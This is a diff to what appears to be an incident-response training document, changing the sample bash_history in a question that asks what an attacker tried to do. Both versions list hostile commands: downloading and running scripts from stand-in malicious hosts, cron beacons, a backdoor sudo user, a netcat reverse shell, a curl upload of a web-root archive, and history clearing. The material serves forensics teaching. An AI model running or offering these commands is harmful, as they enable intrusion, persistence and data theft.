@@ -63,23 +63,21 @@ Detected PE file header at 0x2000000 in process explorer.exe.
 ```
 ## 4. Investigate output of bash_history can you tell me what user tried to acheive here?
 ```
-ls -alh /home/user
-find / -name "config*" -exec cat {} \;
-echo "10.10.10.1" >> /etc/hosts
-ping -c 4 win-updater-live.ru
-mkdir -p /var/tmp/new_folder
-cp /bin/bash /var/tmp/new_folder/bash
-chmod +x /var/tmp/new_folder/bash
-/var/tmp/new_folder/bash -p
-echo "attacker_password" | sudo -S usermod -aG sudo attacker
-ssh -o StrictHostKeyChecking=no -i /root/.ssh/id_rsa attacker@192.168.1.10
-echo "0 3 * * * /tmp/persistence_script.sh" >> /var/spool/cron/crontabs/root
-wget http://win-updater-live.ru/persistence_script.sh -O /tmp/persistence_script.sh
-chmod +x /tmp/persistence_script.sh
-/tmp/persistence_script.sh
-cat /etc/passwd | grep root
-chmod 700 /home/attacker/.ssh
-history -c
+1  wget http://malicious-domain.com/shell.sh -O /tmp/shell.sh
+2  chmod +x /tmp/shell.sh
+3  ./tmp/shell.sh
+4  echo '* * * * * /usr/bin/curl http://malicious-domain.com/beacon.sh | sh' > /etc/cron.d/persistence
+5  crontab /etc/cron.d/persistence
+6  useradd -m -s /bin/bash backdoor
+7  echo 'backdoor:password123' | chpasswd
+8  echo 'backdoor ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
+9  apt update && apt install -y netcat
+10 nc -e /bin/bash attacker-ip 4444
+11 tar -czvf sensitive_data.tar.gz /var/www/html
+12 curl -X POST -F "file=@sensitive_data.tar.gz" http://malicious-domain.com/upload
+13 iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT
+14 iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT
+15 history -c
 ```
 
 ## 5. During investigation of command line transcript you noticed below commands, can you explain what is going on?
